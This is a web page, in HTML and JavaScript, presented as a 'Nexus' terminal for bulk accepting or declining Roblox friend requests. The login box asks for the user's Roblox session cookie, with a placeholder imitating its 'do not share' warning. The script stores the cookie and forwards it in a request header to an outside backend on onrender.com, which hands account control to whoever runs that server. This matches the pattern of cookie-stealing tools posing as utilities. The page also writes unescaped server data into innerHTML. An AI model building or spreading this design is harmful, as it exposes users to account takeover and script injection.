<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nexus | Top Tier Terminal</title>
    <style>
        :root { --bg: #050508; --panel: rgba(15, 15, 22, 0.85); --neon-blue: #00f3ff; --neon-red: #ff003c; --neon-purple: #b500ff; --text: #e0e0e0; --glow: 0 0 15px rgba(0, 243, 255, 0.3); }
        body { background-color: var(--bg); color: var(--text); font-family: 'Segoe UI', system-ui, sans-serif; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; overflow-y: scroll; }
        ::-webkit-scrollbar { width: 8px; } ::-webkit-scrollbar-track { background: var(--bg); } ::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: var(--neon-blue); }
        h1 { color: var(--neon-blue); text-shadow: var(--glow); margin: 2rem 0 1rem; letter-spacing: 3px; font-weight: 800; text-transform: uppercase; }
        #login-section { background: var(--panel); backdrop-filter: blur(12px); border: 1px solid rgba(0, 243, 255, 0.2); border-radius: 16px; padding: 40px; text-align: center; margin-top: 10vh; box-shadow: var(--glow); width: 90%; max-width: 400px; }
        #cookie-input { width: 100%; box-sizing: border-box; padding: 12px 15px; margin: 20px 0; background: rgba(0,0,0,0.6); border: 1px solid #444; color: var(--neon-blue); border-radius: 8px; outline: none; font-family: monospace; }
        #cookie-input:focus { border-color: var(--neon-blue); }
        #dashboard-section { width: 100%; max-width: 1400px; padding: 0 20px; box-sizing: border-box; }
        .sticky-header { position: sticky; top: 0; z-index: 100; background: rgba(5, 5, 8, 0.95); backdrop-filter: blur(10px); padding: 20px 0; border-bottom: 1px solid rgba(255,255,255,0.05); margin-bottom: 25px; }
        .controls-grid { display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center; gap: 15px; background: var(--panel); padding: 15px 25px; border-radius: 12px; border: 1px solid rgba(0, 243, 255, 0.15); box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
        .search-bar { flex: 1; min-width: 200px; padding: 10px 15px; border-radius: 6px; border: 1px solid #444; background: rgba(0,0,0,0.5); color: #fff; outline: none; transition: 0.3s; }
        .search-bar:focus { border-color: var(--neon-blue); }
        .stats-display { font-size: 0.85rem; color: #aaa; text-transform: uppercase; letter-spacing: 1px; font-weight: bold; }
        #requests-container { display: grid; grid-template-columns: repeat(auto-fill, minmax(240px, 1fr)); gap: 25px; width: 100%; padding-bottom: 20px; }
        .user-card { background: var(--panel); border: 1px solid rgba(255,255,255,0.05); border-radius: 16px; padding: 25px 20px; display: flex; flex-direction: column; align-items: center; text-align: center; box-shadow: 0 8px 30px rgba(0,0,0,0.4); transition: transform 0.2s, border-color 0.2s; position: relative; }
        .user-card:hover { border-color: rgba(0, 243, 255, 0.4); transform: translateY(-3px); }
        .pfp { width: 90px; height: 90px; border-radius: 50%; border: 3px solid rgba(0, 243, 255, 0.2); margin-bottom: 15px; padding: 3px; background: #000; }
        .names { width: 100%; margin-bottom: 20px; }
        .names h2 { margin: 0; font-size: 1.15rem; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .names p { margin: 5px 0 0 0; font-size: 0.9rem; color: var(--neon-blue); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .actions { display: flex; width: 100%; gap: 12px; }
        button { padding: 10px 0; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.2s; text-transform: uppercase; flex: 1; font-size: 0.85rem; letter-spacing: 1px; }
        button:disabled { opacity: 0.4; cursor: not-allowed; }
        .btn-blue { background: rgba(0, 243, 255, 0.05); color: var(--neon-blue); border: 1px solid var(--neon-blue); }
        .btn-blue:hover:not(:disabled) { background: var(--neon-blue); color: #000; box-shadow: var(--glow); }
        .btn-red { background: rgba(255, 0, 60, 0.05); color: var(--neon-red); border: 1px solid var(--neon-red); }
        .btn-red:hover:not(:disabled) { background: var(--neon-red); color: #fff; box-shadow: 0 0 15px rgba(255, 0, 60, 0.4); }
        .btn-purple { background: rgba(181, 0, 255, 0.05); color: var(--neon-purple); border: 1px solid var(--neon-purple); }
        .btn-purple:hover:not(:disabled) { background: var(--neon-purple); color: #fff; box-shadow: 0 0 15px rgba(181, 0, 255, 0.4); }
        .btn-white { background: transparent; color: #fff; border: 1px solid #555; }
        .btn-white:hover:not(:disabled) { background: #fff; color: #000; }
        .pagination-bar { display: flex; justify-content: center; align-items: center; gap: 20px; margin-bottom: 50px; background: var(--panel); padding: 15px; border-radius: 12px; border: 1px solid rgba(0, 243, 255, 0.15); }
        .page-indicator { font-weight: bold; color: var(--neon-blue); letter-spacing: 1px; }
        #export-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; justify-content: center; align-items: center; backdrop-filter: blur(5px); }
        .modal-content { background: var(--panel); border: 1px solid var(--neon-purple); border-radius: 12px; padding: 30px; width: 80%; max-width: 600px; box-shadow: 0 0 30px rgba(181, 0, 255, 0.2); }
        #export-textarea { width: 100%; height: 300px; background: #000; color: var(--neon-blue); border: 1px solid #444; border-radius: 6px; padding: 15px; box-sizing: border-box; font-family: monospace; resize: vertical; margin-bottom: 20px; outline: none; }
        #toast-container { position: fixed; bottom: 25px; right: 25px; display: flex; flex-direction: column; gap: 15px; z-index: 1000; }
        .toast { background: rgba(15, 15, 22, 0.95); backdrop-filter: blur(5px); border-left: 4px solid var(--neon-blue); padding: 16px 24px; color: #fff; border-radius: 6px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); animation: slideIn 0.4s cubic-bezier(0.2, 0.8, 0.2, 1) forwards; }
        .toast.error { border-left-color: var(--neon-red); }
        @keyframes slideIn { from { transform: translateX(120%); } to { transform: translateX(0); } }
    </style>
</head>
<body>
    <h1>NEXUS // TERMINAL</h1>
    <div id="login-section">
        <h2>System Override</h2>
        <input type="password" id="cookie-input" placeholder="_|WARNING:-DO-NOT-SHARE-THIS...">
        <button class="btn-blue" onclick="saveCookie()" style="width: 100%; padding: 12px 0;">Initialize Connection</button>
    </div>
    <div id="dashboard-section" style="display: none;">
        <div class="sticky-header">
            <div class="controls-grid">
                <input type="text" id="search-input" class="search-bar" placeholder="Search targets..." oninput="handleFilterChange()">
                <label class="toggle-container"><input type="checkbox" id="bot-filter-toggle" onchange="handleFilterChange()">Strict Anti-Bot Filter</label>
                <div class="stats-display" id="request-count">Targets Found: 0</div>
                <div style="display: flex; gap: 10px;">
                    <button class="btn-blue" onclick="massActionAll('accept')" id="btn-accept-all">ACCEPT ALL</button>
                    <button class="btn-red" onclick="massActionAll('decline')" id="btn-decline-all">DECLINE ALL</button>
                </div>
                <div style="display: flex; gap: 10px;">
                    <button class="btn-purple" onclick="exportBlocklist()">Export Blocklist</button>
                    <button class="btn-blue" onclick="manualRefresh()">⟳ Sync</button>
                    <button class="btn-white" onclick="logout()">Disconnect</button>
                </div>
            </div>
        </div>
        <div id="requests-container"></div>
        <div class="pagination-bar">
            <button class="btn-white" onclick="changePage(-1)" id="btn-prev">◄ Previous</button>
            <div class="page-indicator" id="page-indicator">Page 1 of 1</div>
            <button class="btn-white" onclick="changePage(1)" id="btn-next">Next ►</button>
        </div>
    </div>
    <div id="export-modal"><div class="modal-content"><h2>System Blocklist Data</h2><textarea id="export-textarea" readonly></textarea><button class="btn-purple" onclick="copyExportText()">Copy</button><button class="btn-white" onclick="closeModal()">Close</button></div></div>
    <div id="toast-container"></div>

    <script>
        // THIS IS THE BRAIN CONNECTION:
        const BACKEND_URL = 'https://nexus-backend-e72a.onrender.com'; 

        const loginSection = document.getElementById('login-section');
        const dashboardSection = document.getElementById('dashboard-section');
        const container = document.getElementById('requests-container');
        const searchInput = document.getElementById('search-input');
        const filterToggle = document.getElementById('bot-filter-toggle');
        const countDisplay = document.getElementById('request-count');
        const pageIndicator = document.getElementById('page-indicator');
        const exportModal = document.getElementById('export-modal');
        const exportTextarea = document.getElementById('export-textarea');
        
        let isProcessingMassAction = false;
        let currentIds = []; 
        let loadedDetailsMap = new Map();
        let currentPage = 1;
        const itemsPerPage = 60; 

        function showToast(message, type = '') {
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.innerText = message;
            document.getElementById('toast-container').appendChild(toast);
            setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 300); }, 3500);
        }

        const delay = ms => new Promise(res => setTimeout(res, ms));

        function checkAuth() {
            const cookie = localStorage.getItem('nexusSession');
            if (cookie) {
                loginSection.style.display = 'none';
                dashboardSection.style.display = 'block';
                if (currentIds.length === 0) loadRequests();
            } else {
                loginSection.style.display = 'block';
                dashboardSection.style.display = 'none';
            }
        }

        function saveCookie() {
            const input = document.getElementById('cookie-input').value.trim();
            if (input) {
                localStorage.setItem('nexusSession', input);
                currentIds = []; loadedDetailsMap.clear(); currentPage = 1;
                checkAuth();
            }
        }

        function logout() { localStorage.removeItem('nexusSession'); location.reload(); }

        function manualRefresh() {
            if (isProcessingMassAction) return;
            showToast("Syncing with Render...");
            currentIds = []; loadedDetailsMap.clear(); currentPage = 1;
            loadRequests();
        }

        async function loadRequests() {
            const cookie = localStorage.getItem('nexusSession');
            try {
                const response = await fetch(`${BACKEND_URL}/api/requests/ids`, { headers: { 'roblox-cookie': cookie } });
                const ids = await response.json();
                currentIds = ids;
                countDisplay.innerText = `Total Targets: ${currentIds.length}`;
                renderPage();
            } catch (err) { showToast('Backend waking up... wait 30s', 'error'); }
        }

        async function exportBlocklist() {
            try {
                const response = await fetch(`${BACKEND_URL}/api/blocklist`);
                const data = await response.json();
                exportTextarea.value = data.ids.map(id => `"${id}",`).join('\n');
                exportModal.style.display = 'flex';
            } catch (err) { showToast("Blocklist fetch failed", "error"); }
        }

        function closeModal() { exportModal.style.display = 'none'; }
        function copyExportText() { exportTextarea.select(); document.execCommand('copy'); showToast("Copied!"); }
        function handleFilterChange() { renderPage(); }

        function changePage(direction) {
            currentPage += direction;
            window.scrollTo({ top: 0, behavior: 'smooth' });
            renderPage();
        }

        function renderPage() {
            container.innerHTML = '';
            const pageIds = currentIds.slice((currentPage - 1) * itemsPerPage, currentPage * itemsPerPage);
            pageIndicator.innerText = `Page ${currentPage}`;
            pageIds.forEach(id => {
                const card = document.createElement('div');
                card.className = 'user-card';
                card.id = `user-${id}`;
                container.appendChild(card);
                updateCardVisual(id, card);
            });
            hydrateVisibleIds(pageIds);
        }

        async function hydrateVisibleIds(pageIds) {
            const unhydrated = pageIds.filter(id => !loadedDetailsMap.has(id));
            if (unhydrated.length === 0) return;
            const response = await fetch(`${BACKEND_URL}/api/requests/details`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ userIds: unhydrated })
            });
            const details = await response.json();
            details.forEach(d => loadedDetailsMap.set(d.id, d));
            pageIds.forEach(id => updateCardVisual(id, document.getElementById(`user-${id}`)));
        }

        function updateCardVisual(id, card) {
            if (!card) return;
            const details = loadedDetailsMap.get(id);
            if (!details) {
                card.innerHTML = `<div class="skeleton-pfp"></div><div class="skeleton-text"></div>`;
                return;
            }
            card.innerHTML = `
                <img src="${details.pfp}" class="pfp">
                <div class="names"><h2>${details.displayName}</h2><p>@${details.username}</p></div>
                <div class="actions">
                    <button class="btn-blue" onclick="handleAction(${id}, 'accept')">ACCEPT</button>
                    <button class="btn-red" onclick="handleAction(${id}, 'decline')">DECLINE</button>
                </div>`;
        }

        async function handleAction(userId, action) {
            const cookie = localStorage.getItem('nexusSession');
            const card = document.getElementById(`user-${userId}`);
            if (card) card.style.opacity = '0.3';
            const response = await fetch(`${BACKEND_URL}/api/action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'roblox-cookie': cookie },
                body: JSON.stringify({ userId, action })
            });
            const result = await response.json();
            if (result.success) {
                if (card) card.remove();
                currentIds = currentIds.filter(id => id !== userId);
                countDisplay.innerText = `Total Targets: ${currentIds.length}`;
            }
        }

        async function massActionAll(action) {
            isProcessingMassAction = true;
            showToast(`Processing all targets...`);
            const ids = [...currentIds];
            for (let i = 0; i < ids.length; i++) {
                await handleAction(ids[i], action);
                await delay(350);
            }
            isProcessingMassAction = false;
            showToast("Complete!");
            loadRequests();
        }

        checkAuth();
    </script>
</body>
</html>
